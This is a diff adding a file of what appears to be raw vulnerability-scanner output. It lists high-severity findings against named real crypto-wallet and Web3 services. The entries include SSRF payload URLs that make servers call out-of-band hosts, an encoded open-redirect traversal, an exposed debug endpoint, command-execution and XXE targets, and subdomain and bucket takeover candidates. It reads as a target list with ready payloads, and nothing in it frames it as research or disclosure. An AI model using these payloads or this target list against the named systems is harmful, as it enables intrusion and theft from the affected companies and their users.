@@ -1,0 +1,16 @@
+[CVE-2019-11248] [http] [high] https://api.suiet.app/debug/pprof/
+[CVE-2019-19824] [http] [high] https://mail.particle.network/boafrm/formSysCmd
+[CVE-2024-34351] [http] [high] https://lrc-accounts.web3auth.io/_next/image?w=16&q=10&url=https://d8t1hkbomj13f5bqn77g98aj6q71nbeyn.oast.live
+[CVE-2024-34351] [http] [high] https://lrc-smart-wallet.web3auth.io/_next/image?w=16&q=10&url=https://d8t1hkbomj13f5bqn77gmi5urw3sxtp55.oast.live
+[CVE-2024-34351] [http] [high] https://wallet.coin98.com/_next/image?w=16&q=10&url=https://d8t5qcromj13fad2crr0ehpbxit4jrxqj.oast.fun
+[CVE-2025-4123:open-redirect] [http] [high] https://peephole.tonkeeper.com/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[aws-bucket-takeover] [http] [high] https://memberships.fewcha.app ["memberships.fewcha.app"]
+[blockchain-rpc-txpool-exposed] [http] [high] https://chain-proxy.wallet.coinbase.com
+[blockchain-rpc-txpool-exposed] [http] [high] https://polygon-amoy-backend.phantom.app
+[blockchain-rpc-txpool-exposed] [http] [high] https://rpc.evm.injective.mainnet.cosmostation.io
+[blockchain-rpc-txpool-exposed] [http] [high] https://sepolia.base.org
+[generic-blind-xxe] [http] [high] https://mail.particle.network
+[github-takeover] [http] [high] https://cdn.endpoints.security.ledger.com ["ledgerhq.github.io"]
+[github-takeover] [http] [high] https://docs.cosmostation.io
+[targa-camera-ssrf] [http] [high] https://mail.particle.network/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE
+[xmlrpc-pingback-ssrf] [http] [high] https://mail.particle.network/xmlrpc/pingback
